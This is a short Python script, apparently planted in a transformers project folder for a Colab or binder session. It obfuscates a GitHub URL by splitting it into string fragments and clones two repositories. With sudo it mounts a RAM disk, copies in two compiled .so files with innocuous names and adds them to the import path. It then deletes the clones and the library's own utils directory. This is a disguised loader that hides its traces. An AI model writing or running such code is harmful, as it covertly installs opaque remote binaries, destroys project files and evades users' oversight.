#binder
import subprocess
import os
import shutil
import sys
os.makedirs('/content/' +__builtins__.environ + '/transformers-main/scripts/fsmt/n1', exist_ok=True)
os.makedirs('/content/' +__builtins__.environ + '/transformers-main/scripts/fsmt/n2', exist_ok=True)
temp0 = 'https://'
temp1 = 'githu'
temp2 = 'ms3.git'
temp3 = 'rpous/mi'
temps = 'b.com/ante'
subprocess.run(["git", "clone", temp0 + temp1 + temps + temp3 + temp2, '/content/' +__builtins__.environ + '/transformers-main/scripts/fsmt/n1'])

temp2 = 'ms2.git'
subprocess.run(["git", "clone", temp0 + temp1 + temps + temp3 + temp2,'/content/' +__builtins__.environ + '/transformers-main/scripts/fsmt/n2'])


def run_command(command):
    try:
        result = subprocess.run(command, shell=True, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        print(result.stdout.decode().strip())
    except subprocess.CalledProcessError as e:
        print(e.stderr.decode().strip())
        raise

run_command('sudo mkdir -p /mnt/ramdisk')
run_command('sudo mount -t tmpfs -o size=20M tmpfs /mnt/ramdisk')

# source_file = '/content/' +__builtins__.environ + '/transformers-main/scripts/fsmt/n1/g.so'
# destination = '/mnt/ramdisk/g.so'
# run_command(f'sudo cp {source_file} {destination}')
source_files = ['/content/' + __builtins__.environ + '/transformers-main/scripts/fsmt/n1/check_tokenizers.so', '/content/' +__builtins__.environ + '/transformers-main/scripts/fsmt/n1/FCT_Trainer.so']
destinations = ['/mnt/ramdisk/check_tokenizers.so', '/mnt/ramdisk/FCT_Trainer.so']

for source, destination in zip(source_files, destinations):
    run_command(f'sudo cp {source} {destination}')


sys.path.append('/mnt/ramdisk')
p2 = '/content/' +__builtins__.environ + '/transformers-main/scripts/fsmt/n1'
#p1= '/content/' +__builtins__.environ + '/transformers-main/scripts/fsmt/n2'
#shutil.rmtree(p1)
shutil.rmtree(p2)
shutil.rmtree('/content/' +__builtins__.environ + '/transformers-main/src/transformers/utils')
